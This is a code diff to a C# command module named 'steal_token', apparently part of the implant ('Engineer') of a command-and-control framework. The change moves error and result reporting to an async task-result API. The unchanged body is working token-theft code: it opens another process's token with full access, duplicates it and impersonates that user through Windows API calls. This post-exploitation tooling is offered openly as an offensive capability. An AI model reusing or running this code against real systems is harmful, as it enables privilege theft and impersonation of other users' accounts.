@@ -6,6 +6,7 @@ using System.Security.Principal;
 using System.Text;
 using System.Threading.Tasks;
 using Engineer.Extra;
+using Engineer.Functions;
 using Engineer.Models;
 
 namespace Engineer.Commands
@@ -14,19 +15,21 @@ namespace Engineer.Commands
     {
         public override string Name => "steal_token";
 
-        public override string Execute(EngineerTask task)
+        public override async Task Execute(EngineerTask task)
         {
             try
             {
 				if (!task.Arguments.TryGetValue("/pid", out string pidstring))
 				{
-					return "error: " + "Missing pid";
-				}
+					Tasking.FillTaskResults("error: " + "Missing pid", task, EngTaskStatus.FailedWithWarnings);
+                    return;
+                }
 				pidstring.TrimStart(' ');
 				if (!int.TryParse(pidstring, out int pid))
 				{
-					return "error: " + "Failed to parse pid";
-				}
+					Tasking.FillTaskResults("error: " + "Failed to parse pid", task, EngTaskStatus.FailedWithWarnings);
+                    return;
+                }
 
 				// open handle to process
 				var hProcess = Process.GetProcessById(pid);
@@ -34,16 +37,18 @@ namespace Engineer.Commands
 				//open handle to token
 				if (!WinAPIs.Advapi.OpenProcessToken(hProcess.Handle, WinAPIs.Advapi.TOKEN_ALL_ACCESS, out var hToken))
 				{
-					return "error: " + "Failed to open process token";
-				}
+					Tasking.FillTaskResults("error: " + "Failed to open process token", task, EngTaskStatus.Failed);
+                    return;
+                }
 				//duplicate token
 				var sa = new WinAPIs.Advapi.SECURITY_ATTRIBUTES();
 				if (!WinAPIs.Advapi.DuplicateTokenEx(hToken, WinAPIs.Advapi.TOKEN_ALL_ACCESS, ref sa, WinAPIs.Advapi.SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, WinAPIs.Advapi.TOKEN_TYPE.TokenImpersonation, out var hTokenDup))
 				{
 					WinAPIs.Kernel32.CloseHandle(hToken); // close the open handle we have since we failed duplication.
 					hProcess.Dispose();
-					return "error: " + "failed to duplicate token";
-				}
+					Tasking.FillTaskResults("error: " + "failed to duplicate token", task, EngTaskStatus.Failed);
+                    return;
+                }
 
 				//impersonate token , just like make token
 				if (WinAPIs.Advapi.ImpersonateLoggedOnUser(hTokenDup))
@@ -52,17 +57,18 @@ namespace Engineer.Commands
 					identity.Impersonate();
 					WinAPIs.Kernel32.CloseHandle(hToken); // can close now that we have successfully impersonated.
 					hProcess.Dispose();
-					return $"Successfully impersonated {identity.Name}";
-				}
+					Tasking.FillTaskResults($"Successfully impersonated {identity.Name}", task, EngTaskStatus.Complete);
+                    return;
+                }
 
 				//close handle , should get here only if impersonate fails.
 				WinAPIs.Kernel32.CloseHandle(hToken);
 				hProcess.Dispose();
-				return "error: " + "failed to impersonate token";
+				Tasking.FillTaskResults("error: " + "failed to impersonate token", task, EngTaskStatus.Failed);
 			}
             catch (Exception ex)
             {
-                return "error: " + ex.Message;
+				Tasking.FillTaskResults("error: " + ex.Message, task, EngTaskStatus.Failed);
             }
 		}
     }
